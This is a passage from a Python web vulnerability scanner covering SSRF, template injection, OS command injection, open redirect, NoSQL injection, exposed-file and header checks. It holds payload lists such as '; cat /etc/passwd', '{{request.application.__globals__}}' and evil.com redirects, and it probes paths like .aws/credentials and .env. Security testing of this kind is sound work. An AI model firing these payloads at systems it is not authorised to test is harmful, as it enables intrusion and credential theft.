                                category="OWASP-A10 Server-Side Request Forgery (SSRF)",
                                evidence=f"Payload: {ssrf_url} ({label})\nIndicator matched: {indicator.pattern}\nResponse snippet indicates internal resource access",
                                impact="An attacker could access internal services, cloud metadata, or pivot into the internal network.",
                                remediation="Validate and allowlist URLs server-side. Block requests to internal/private IPs. Disable unnecessary URL fetching.",
                                cvss="9.1 (Critical)",
                            ))
                            return findings

                    if baseline and resp.status_code == 200:
                        if len(resp.text) > 0 and abs(len(resp.text) - len(baseline.text)) > 200:
                            findings.append(Finding(
                                title=f"Possible SSRF via '{pn}'",
                                severity="Medium",
                                url=test_url,
                                category="OWASP-A10 Server-Side Request Forgery (SSRF)",
                                evidence=f"Payload: {ssrf_url} ({label})\nResponse length changed significantly ({len(baseline.text)} -> {len(resp.text)})",
                                impact="The server may be fetching attacker-controlled URLs. Further investigation needed.",
                                remediation="Validate and allowlist URLs server-side. Block requests to internal/private IPs.",
                                cvss="6.5 (Medium)",
                            ))
                            return findings
                except requests.RequestException:
                    continue
    return findings


# ---------------------------------------------------------------------------
# SSTI detection (Server-Side Template Injection)
# ---------------------------------------------------------------------------

SSTI_PAYLOADS = [
    # Jinja2 / Twig
    ("{{7*7}}", "49"),
    ("{{7*'7'}}", "7777777"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    # Freemarker
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("${\"freemarker\".replace(\"free\",\"\")}",  "marker"),
    # Velocity
    ("#set($x=7*7)${x}", "49"),
    # Mako
    ("${7*7}", "49"),
    ("<% import os %>", ""),
    # Smarty
    ("{php}echo 7*7;{/php}", "49"),
    # ERB (Ruby)
    ("<%= 7*7 %>", "49"),
    # Pebble
    ("{% set x = 7*7 %}{{x}}", "49"),
    # General polyglots
    ("{{config}}", "__class__"),
    ("{{self.__class__}}", "TemplateReference"),
    ("{{request.application.__globals__}}", "os"),
    ("${{7*7}}", "49"),
    ("{{7*7}}a]b", "49a]b"),
    ("{{dump(app)}}", "AppVariable"),
]


def test_ssti(url: str) -> list[Finding]:
    findings: list[Finding] = []
    _t0 = time.time()
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return findings

    for param_name in params:
        if _budget_expired(_t0):
            return findings
        for payload, expected in randomize_order(SSTI_PAYLOADS):
            if not expected:
                continue
            for pn, test_url in _inject_into_params(url, payload, [param_name]):
                try:
                    resp = _req().get(test_url, timeout=TIMEOUT, allow_redirects=False)
                    if expected in resp.text:
                        if payload in resp.text and expected not in payload:
                            continue
                        findings.append(Finding(
                            title=f"Server-Side Template Injection via '{pn}'",
                            severity="Critical",
                            url=test_url,
                            category="OWASP-A03 Injection (SSTI)",
                            evidence=f"Payload: {payload}\nExpected: {expected}\nServer evaluated the template expression (found '{expected}' in response)",
                            impact="An attacker could achieve remote code execution by injecting template directives.",
                            remediation="Never pass user input directly into template engines. Use sandboxed rendering and logic-less templates.",
                            cvss="9.8 (Critical)",
                        ))
                        return findings
                except requests.RequestException:
                    continue
    return findings


# ---------------------------------------------------------------------------
# Command Injection detection
# ---------------------------------------------------------------------------

CMDI_TIME_PAYLOADS = [
    ("; sleep 3", 3),
    ("| sleep 3", 3),
    ("|| sleep 3", 3),
    ("&& sleep 3", 3),
    ("`sleep 3`", 3),
    ("$(sleep 3)", 3),
    ("& sleep 3 &", 3),
    ("%0asleep 3", 3),
    ("'; sleep 3; '", 3),
    ("\"; sleep 3; \"", 3),
    ("; ping -c 3 127.0.0.1", 3),
    ("| ping -c 3 127.0.0.1", 3),
    ("& ping -n 3 127.0.0.1 &", 3),
]

CMDI_OUTPUT_PAYLOADS = [
    ("; id", [re.compile(r"uid=\d+\(")]),
    ("| id", [re.compile(r"uid=\d+\(")]),
    ("|| id", [re.compile(r"uid=\d+\(")]),
    ("`id`", [re.compile(r"uid=\d+\(")]),
    ("$(id)", [re.compile(r"uid=\d+\(")]),
    ("; cat /etc/passwd", [re.compile(r"root:.*:0:0:")]),
    ("| cat /etc/passwd", [re.compile(r"root:.*:0:0:")]),
    ("; whoami", [re.compile(r"^(root|www-data|apache|nginx|nobody|daemon)\s*$", re.MULTILINE)]),
    ("| whoami", [re.compile(r"^(root|www-data|apache|nginx|nobody|daemon)\s*$", re.MULTILINE)]),
    ("; uname -a", [re.compile(r"Linux|Darwin|FreeBSD")]),
    ("| uname -a", [re.compile(r"Linux|Darwin|FreeBSD")]),
    ("; echo CMDI_MARKER_7x7", [re.compile(r"CMDI_MARKER_7x7")]),
    ("| echo CMDI_MARKER_7x7", [re.compile(r"CMDI_MARKER_7x7")]),
    ("&& echo CMDI_MARKER_7x7", [re.compile(r"CMDI_MARKER_7x7")]),
    ("$(echo CMDI_MARKER_7x7)", [re.compile(r"CMDI_MARKER_7x7")]),
    ("`echo CMDI_MARKER_7x7`", [re.compile(r"CMDI_MARKER_7x7")]),
]


def test_cmdi(url: str) -> list[Finding]:
    findings: list[Finding] = []
    _t0 = time.time()
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return findings

    cmd_params = [p for p in params if any(kw in p.lower() for kw in
                  ("cmd", "exec", "command", "run", "ping", "query", "jump",
                   "code", "reg", "do", "func", "arg", "option", "load",
                   "process", "step", "read", "feature", "exe", "module",
                   "payload", "daemon", "upload", "log", "ip", "cli",
                   "host", "file", "path", "dir"))]
    if not cmd_params:
        cmd_params = list(params.keys())

    # Output-based detection
    for param_name in cmd_params:
        if _budget_expired(_t0):
            return findings
        for payload, patterns in randomize_order(CMDI_OUTPUT_PAYLOADS):
            for pn, test_url in _inject_into_params(url, payload, [param_name]):
                try:
                    resp = _req().get(test_url, timeout=TIMEOUT, allow_redirects=False)
                    for pat in patterns:
                        if pat.search(resp.text):
                            findings.append(Finding(
                                title=f"OS Command Injection via '{pn}'",
                                severity="Critical",
                                url=test_url,
                                category="OWASP-A03 Injection (OS Command)",
                                evidence=f"Payload: {payload}\nCommand output detected: {pat.pattern[:60]}",
                                impact="An attacker could execute arbitrary OS commands on the server, leading to full system compromise.",
                                remediation="Never pass user input to shell commands. Use language-native APIs instead of os.system/exec/popen.",
                                cvss="9.8 (Critical)",
                            ))
                            return findings
                except requests.RequestException:
                    continue

    # Time-based blind detection
    for param_name in cmd_params:
        if _budget_expired(_t0):
            return findings
        for payload, delay in randomize_order(CMDI_TIME_PAYLOADS):
            for pn, test_url in _inject_into_params(url, payload, [param_name]):
                try:
                    start = time.time()
                    _req().get(test_url, timeout=TIMEOUT + delay, allow_redirects=False)
                    elapsed = time.time() - start

                    if elapsed >= delay * 0.8:
                        start2 = time.time()
                        _req().get(url, timeout=TIMEOUT, allow_redirects=False)
                        baseline_time = time.time() - start2
                        if elapsed > baseline_time + (delay * 0.6):
                            findings.append(Finding(
                                title=f"Blind OS Command Injection (time-based) via '{pn}'",
                                severity="Critical",
                                url=test_url,
                                category="OWASP-A03 Injection (OS Command)",
                                evidence=f"Payload: {payload}\nResponse delayed {elapsed:.1f}s (baseline: {baseline_time:.1f}s, expected delay: {delay}s)",
                                impact="An attacker could execute arbitrary OS commands blindly via time-based inference.",
                                remediation="Never pass user input to shell commands. Use language-native APIs.",
                                cvss="9.8 (Critical)",
                            ))
                            return findings
                except requests.RequestException:
                    continue
    return findings


# ---------------------------------------------------------------------------
# Open Redirect detection
# ---------------------------------------------------------------------------

REDIRECT_PARAM_NAMES = ["url", "redirect", "redirect_url", "redirect_uri",
                         "next", "return", "returnto", "return_url", "goto",
                         "dest", "destination", "redir", "out", "view",
                         "target", "to", "link", "forward", "continue",
                         "callback", "path", "rurl", "page"]

REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "https://evil.com/%2f..",
    "/\\evil.com",
    "////evil.com",
    "https:evil.com",
    "http://evil.com",
    "\\.evil.com",
    "https://evil.com@legitimate.com",
    "https://legitimate.com.evil.com",
    "//evil%00.com",
    "https://evil.com#",
    "//evil.com/%2F%2E%2E",
    "/%09/evil.com",
    "/%5cevil.com",
    "//%0d%0aevil.com",
    "https://evil.com?",
    "///evil.com",
    "java%0d%0ascript%0d%0a:alert(0)",
]


def test_open_redirect(url: str) -> list[Finding]:
    findings: list[Finding] = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return findings

    candidate_params = [p for p in params if p.lower() in REDIRECT_PARAM_NAMES]
    if not candidate_params:
        candidate_params = list(params.keys())

    for param_name in candidate_params:
        for payload in randomize_order(REDIRECT_PAYLOADS):
            for pn, test_url in _inject_into_params(url, payload, [param_name]):
                try:
                    resp = _req().get(test_url, timeout=TIMEOUT, allow_redirects=False)
                    if resp.status_code in (301, 302, 303, 307, 308):
                        location = resp.headers.get("Location", "")
                        loc_parsed = urlparse(location)
                        if loc_parsed.netloc and loc_parsed.netloc != parsed.netloc:
                            if "evil.com" in loc_parsed.netloc or loc_parsed.netloc != parsed.netloc:
                                findings.append(Finding(
                                    title=f"Open Redirect via '{pn}'",
                                    severity="Medium",
                                    url=test_url,
                                    category="OWASP-A01 Broken Access Control (Open Redirect)",
                                    evidence=f"Payload: {payload}\nRedirects to: {location}\nHTTP {resp.status_code} with external Location header",
                                    impact="An attacker could redirect users to malicious sites for phishing or malware delivery.",
                                    remediation="Validate redirect targets against an allowlist of trusted domains. Use relative paths only.",
                                    cvss="4.7 (Medium)",
                                ))
                                return findings

                    if resp.status_code == 200:
                        meta_refresh = re.search(
                            r'<meta[^>]*http-equiv=["\']?refresh["\']?[^>]*url=([^"\'>]+)',
                            resp.text, re.IGNORECASE
                        )
                        if meta_refresh:
                            redirect_target = meta_refresh.group(1)
                            rp = urlparse(redirect_target)
                            if rp.netloc and rp.netloc != parsed.netloc:
                                findings.append(Finding(
                                    title=f"Open Redirect (meta refresh) via '{pn}'",
                                    severity="Medium",
                                    url=test_url,
                                    category="OWASP-A01 Broken Access Control (Open Redirect)",
                                    evidence=f"Payload: {payload}\nMeta refresh redirect to: {redirect_target}",
                                    impact="An attacker could redirect users to malicious sites via meta refresh.",
                                    remediation="Validate redirect targets. Do not reflect user input in meta refresh tags.",
                                    cvss="4.7 (Medium)",
                                ))
                                return findings
                except requests.RequestException:
                    continue
    return findings


# ---------------------------------------------------------------------------
# NoSQL injection (MongoDB-style: $where, $gt, $ne, operator injection)
# ---------------------------------------------------------------------------

NOSQLI_ERROR_PATTERNS = [
    re.compile(r"SyntaxError|Unexpected token|JSON\.parse|Invalid.*JSON", re.IGNORECASE),
    re.compile(r"MongoError|MongoDB|BSON|ObjectId|Cast to.*failed", re.IGNORECASE),
    re.compile(r"mongodb|mongoose|NoSQL", re.IGNORECASE),
    re.compile(r"\$where|\$gt|\$ne|\$regex|\$eq", re.IGNORECASE),
]

# URL/query param payloads (often passed as JSON to backend)
NOSQLI_PAYLOADS = [
    "' || 1==1 || '",
    "' || 1==1--",
    "'; return true; var a='",
    "1'; return true;//",
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$regex": ".*"}',
    "' && this.password.match(/.*/)//",
    "admin' || '1'=='1",
    "1 || 1",
]


def test_nosqli(url: str) -> list[Finding]:
    """Probe for NoSQL (e.g. MongoDB) injection via URL params; error-based detection."""
    findings: list[Finding] = []
    _t0 = time.time()
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return findings
    baseline = _get_baseline(url)
    baseline_text = baseline.text if baseline else ""

    for param_name in list(params.keys()):
        if _budget_expired(_t0):
            return findings
        for payload in randomize_order(NOSQLI_PAYLOADS):
            for pn, test_url in _inject_into_params(url, payload, [param_name]):
                try:
                    resp = _req().get(test_url, timeout=TIMEOUT, allow_redirects=False)
                    if resp.status_code != 200:
                        continue
                    for pat in NOSQLI_ERROR_PATTERNS:
                        if pat.search(resp.text) and (not baseline_text or not pat.search(baseline_text)):
                            findings.append(Finding(
                                title=f"NoSQL Injection (error-based) via '{pn}'",
                                severity="High",
                                url=test_url,
                                category="OWASP-A03 Injection (NoSQLi)",
                                evidence=f"Payload: {payload}\nResponse matched pattern: {pat.pattern[:60]}",
                                impact="Backend may be parsing input as NoSQL operators; can lead to auth bypass or data exposure.",
                                remediation="Validate and sanitize input; do not pass user input directly into NoSQL queries or operators.",
                                cvss="8.6 (High)",
                            ))
                            return findings
                except requests.RequestException:
                    continue
    return findings


# ---------------------------------------------------------------------------
# Sensitive file / directory discovery
# ---------------------------------------------------------------------------

SENSITIVE_PATHS = [
    (".git/HEAD", [re.compile(r"ref:\s+refs/")]),
    (".git/config", [re.compile(r"\[core\]|\[remote")]),
    (".env", [re.compile(r"(DB_|APP_|SECRET|KEY|PASSWORD|TOKEN|API).*?=", re.IGNORECASE)]),
    (".htaccess", [re.compile(r"RewriteEngine|AuthType|Deny|Allow", re.IGNORECASE)]),
    ("robots.txt", [re.compile(r"(Disallow|Allow|Sitemap):", re.IGNORECASE)]),
    ("sitemap.xml", [re.compile(r"<urlset|<sitemapindex", re.IGNORECASE)]),
    ("wp-config.php.bak", [re.compile(r"DB_NAME|DB_USER|DB_PASSWORD", re.IGNORECASE)]),
    ("wp-config.php~", [re.compile(r"DB_NAME|DB_USER|DB_PASSWORD", re.IGNORECASE)]),
    ("wp-config.php.old", [re.compile(r"DB_NAME|DB_USER|DB_PASSWORD", re.IGNORECASE)]),
    (".DS_Store", [re.compile(rb"Bud1".decode("latin-1"))]),
    ("backup.sql", [re.compile(r"CREATE TABLE|INSERT INTO|DROP TABLE", re.IGNORECASE)]),
    ("database.sql", [re.compile(r"CREATE TABLE|INSERT INTO|DROP TABLE", re.IGNORECASE)]),
    ("dump.sql", [re.compile(r"CREATE TABLE|INSERT INTO|DROP TABLE", re.IGNORECASE)]),
    ("db.sql", [re.compile(r"CREATE TABLE|INSERT INTO|DROP TABLE", re.IGNORECASE)]),
    ("config.php.bak", [re.compile(r"\$db|\$config|\$password", re.IGNORECASE)]),
    ("config.php~", [re.compile(r"\$db|\$config|\$password", re.IGNORECASE)]),
    ("config.yml", [re.compile(r"password:|secret:|api_key:", re.IGNORECASE)]),
    ("config.json", [re.compile(r'"password"|"secret"|"api_key"', re.IGNORECASE)]),
    (".svn/entries", [re.compile(r"dir\n|svn://|http://")]),
    (".svn/wc.db", [re.compile(r"SQLite format")]),
    ("phpinfo.php", [re.compile(r"phpinfo\(\)|PHP Version|PHP Credits", re.IGNORECASE)]),
    ("info.php", [re.compile(r"phpinfo\(\)|PHP Version", re.IGNORECASE)]),
    ("server-status", [re.compile(r"Apache Server Status|Total Accesses", re.IGNORECASE)]),
    ("server-info", [re.compile(r"Apache Server Information|Module Name", re.IGNORECASE)]),
    ("web.config", [re.compile(r"<configuration|connectionString", re.IGNORECASE)]),
    ("crossdomain.xml", [re.compile(r"<cross-domain-policy|allow-access-from", re.IGNORECASE)]),
    ("clientaccesspolicy.xml", [re.compile(r"<access-policy|<grant-to", re.IGNORECASE)]),
    (".bash_history", [re.compile(r"(sudo|ssh|mysql|psql|export|cd )", re.IGNORECASE)]),
    (".aws/credentials", [re.compile(r"aws_access_key_id|aws_secret_access_key", re.IGNORECASE)]),
    ("composer.json", [re.compile(r'"require"|"name"|"autoload"')]),
    ("package.json", [re.compile(r'"name"|"version"|"dependencies"')]),
    ("Gemfile", [re.compile(r"gem ['\"]|source ['\"]")]),
    ("requirements.txt", [re.compile(r"==|>=|~=")]),
    (".dockerenv", [re.compile(r".")]),
    ("Dockerfile", [re.compile(r"FROM |RUN |CMD |EXPOSE ", re.IGNORECASE)]),
    ("docker-compose.yml", [re.compile(r"services:|version:", re.IGNORECASE)]),
    ("application.properties", [re.compile(r"spring\.|server\.|datasource\.", re.IGNORECASE)]),
    ("application.yml", [re.compile(r"spring:|server:|datasource:", re.IGNORECASE)]),
    ("WEB-INF/web.xml", [re.compile(r"<web-app|<servlet", re.IGNORECASE)]),
    ("elmah.axd", [re.compile(r"Error Log for|ELMAH", re.IGNORECASE)]),
    ("trace.axd", [re.compile(r"Application Trace|Request Details", re.IGNORECASE)]),
    (".idea/workspace.xml", [re.compile(r"<project|<component", re.IGNORECASE)]),
    (".vscode/settings.json", [re.compile(r'"editor\.|"files\.')]),
    ("debug.log", [re.compile(r"ERROR|WARN|Exception|Traceback", re.IGNORECASE)]),
    ("error.log", [re.compile(r"ERROR|WARN|Exception|Traceback", re.IGNORECASE)]),
    ("access.log", [re.compile(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}.*?(GET|POST)")]),
    ("admin/", [re.compile(r"<form[^>]*(?:login|password|sign.?in)|admin.?panel|dashboard|log.?in|username", re.IGNORECASE)]),
    ("administrator/", [re.compile(r"<form[^>]*(?:login|password|sign.?in)|admin.?panel|dashboard|log.?in|username", re.IGNORECASE)]),
    ("phpmyadmin/", [re.compile(r"phpMyAdmin|phpmyadmin|pma_navigation|pmahomme", re.IGNORECASE)]),
    (".well-known/security.txt", [re.compile(r"Contact:|Policy:", re.IGNORECASE)]),
]


def _severity_for_path(path: str) -> tuple[str, str, str]:
    """Return (severity, impact, remediation) based on what was found."""
    p = path.lower()
    if any(x in p for x in (".env", "credentials", "wp-config", "config.php", "config.json", "config.yml",
                             "application.properties", "application.yml")):
        return (
            "Critical",
            "Exposed configuration file may contain database credentials, API keys, or secrets.",
            "Remove or restrict access to configuration files. Never store secrets in web-accessible directories.",
        )
    if any(x in p for x in (".git", ".svn", ".idea", ".vscode")):
        return (
            "High",
            "Source control metadata exposure could leak full source code and commit history.",
            "Block access to VCS directories via web server configuration (e.g., deny .git in nginx/apache).",
        )
    if any(x in p for x in ("backup", "dump", "database", ".sql")):
        return (
            "Critical",
            "Database dump exposure could leak all application data including user credentials.",
            "Remove database dumps from web-accessible directories. Use secure off-site backups.",
        )
    if any(x in p for x in ("phpinfo", "server-status", "server-info", "elmah", "trace.axd")):
        return (
            "Medium",
            "Server diagnostic pages expose internal configuration, software versions, and environment details.",
            "Disable or restrict access to diagnostic/info endpoints in production.",
        )
    if any(x in p for x in (".log", "debug", "error", "access.log")):
        return (
            "Medium",
            "Log file exposure may reveal internal paths, errors, IP addresses, and application behavior.",
            "Move log files outside the web root. Restrict access via server configuration.",
        )
    return (
        "Low",
        "Sensitive file exposure provides reconnaissance information to attackers.",
        "Review and restrict access to unnecessary files in the web root.",
    )


def test_sensitive_files(url: str, baseline: Optional[Baseline] = None) -> list[Finding]:
    findings: list[Finding] = []
    _t0 = time.time()
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}/"

    for path, indicators in randomize_order(SENSITIVE_PATHS):
        if _budget_expired(_t0):
            return findings
        check_url = urljoin(base, path)
        try:
            resp = _req().get(check_url, timeout=TIMEOUT, allow_redirects=False)

            if resp.status_code == 200 and len(resp.text) > 0:
                if baseline and is_soft_404(resp, baseline):
                    continue

                for indicator in indicators:
                    if indicator.search(resp.text):
                        sev, impact, remed = _severity_for_path(path)
                        findings.append(Finding(
                            title=f"Sensitive file exposed: /{path}",
                            severity=sev,
                            url=check_url,
                            category="OWASP-A05 Security Misconfiguration (Sensitive File)",
                            evidence=f"HTTP {resp.status_code}\nContent matched: {indicator.pattern[:60]}\nFirst 200 chars: {resp.text[:200]}",
                            impact=impact,
                            remediation=remed,
                            finding_confidence="confirmed",
                        ))
                        break
        except requests.RequestException:
            continue
    return findings


# ---------------------------------------------------------------------------
# Security headers check
# ---------------------------------------------------------------------------

SECURITY_HEADERS = {
    "Strict-Transport-Security": ("HSTS header missing — browser will not enforce HTTPS", "Medium"),
    "Content-Security-Policy": ("CSP header missing — no XSS mitigation at browser level", "Medium"),
    "X-Content-Type-Options": ("X-Content-Type-Options missing — MIME sniffing possible", "Low"),
    "X-Frame-Options": ("X-Frame-Options missing — clickjacking possible", "Medium"),
    "X-XSS-Protection": ("X-XSS-Protection missing — legacy XSS filter not enabled", "Low"),
    "Referrer-Policy": ("Referrer-Policy missing — referrer leakage possible", "Low"),
    "Permissions-Policy": ("Permissions-Policy missing — browser features not restricted", "Low"),
}


def test_security_headers(url: str) -> list[Finding]:
    findings: list[Finding] = []
    try:
        resp = _req().get(url, timeout=TIMEOUT)
        for header, (desc, severity) in SECURITY_HEADERS.items():
            if header.lower() not in {k.lower() for k in resp.headers}:
                findings.append(Finding(
                    title=desc,
                    severity=severity,
                    url=url,
                    category="OWASP-A05 Security Misconfiguration (Headers)",
                    evidence=f"Response headers do not include '{header}'",
                    impact=f"Missing {header} header reduces defense-in-depth against common web attacks.",
                    remediation=f"Add the '{header}' response header with an appropriate value.",
                    finding_confidence="confirmed",
                ))
    except requests.RequestException:
        pass
    return findings


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def run(target_url: str, scan_type: str = "full", crawl_depth: int = 2) -> str:
    report = WebVulnReport(target_url=target_url)
    run_start = time.time()
    max_pages = int(os.environ.get("DIVERG_WEB_VULN_MAX_PAGES", "8"))
    max_depth_cap = int(os.environ.get("DIVERG_WEB_CRAWL_MAX_DEPTH", "4"))

    set_scan_seed(target_url)

    baseline: Optional[Baseline] = None
    try:
        baseline = capture_baseline(_req(), target_url)
    except Exception:
        pass

    try:
        if scan_type == "full":
            eff_depth = max(1, min(int(crawl_depth), max_depth_cap))
            raw_pages = crawl(target_url, depth=eff_depth, max_urls=max_pages)
            ordered: list[str] = []
            for p in [target_url] + raw_pages:
                if p not in ordered:
                    ordered.append(p)
            pages = ordered[:max_pages]
            if _run_budget_expired(run_start):
                pages = pages[:1] if pages else [target_url]
        else:
            pages = [target_url]
        report.pages_crawled = len(pages)
    except Exception as exc:
        report.errors.append(f"Crawl error: {exc}")
        pages = [target_url]

    test_map = (
        ("xss", "XSS", test_xss),
        ("sqli", "SQLi", test_sqli),
        ("nosqli", "NoSQLi", test_nosqli),
        ("csrf", "CSRF", test_csrf),
        ("traversal", "Traversal", test_traversal),
        ("ssrf", "SSRF", test_ssrf),
        ("ssti", "SSTI", test_ssti),
        ("cmdi", "Command Injection", test_cmdi),
        ("redirect", "Open Redirect", test_open_redirect),
    )

    for page in pages:
        if _run_budget_expired(run_start):
            break
        for key, label, func in test_map:
            if _run_budget_expired(run_start):
                break
            if scan_type in ("full", key):
                try:
                    report.findings.extend(func(page))
                except Exception as exc:
                    report.errors.append(f"{label} test error on {page}: {exc}")

    if not _run_budget_expired(run_start) and scan_type in ("full", "files"):
        try:
            report.findings.extend(test_sensitive_files(target_url, baseline=baseline))
        except Exception as exc:
            report.errors.append(f"Sensitive Files test error: {exc}")
    if not _run_budget_expired(run_start) and scan_type in ("full", "headers"):
        try:
            report.findings.extend(test_security_headers(target_url))
        except Exception as exc:
            report.errors.append(f"Security Headers test error: {exc}")

    return json.dumps(asdict(report), indent=2)


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://example.com"
    st = sys.argv[2] if len(sys.argv) > 2 else "full"
    print(run(target, st))
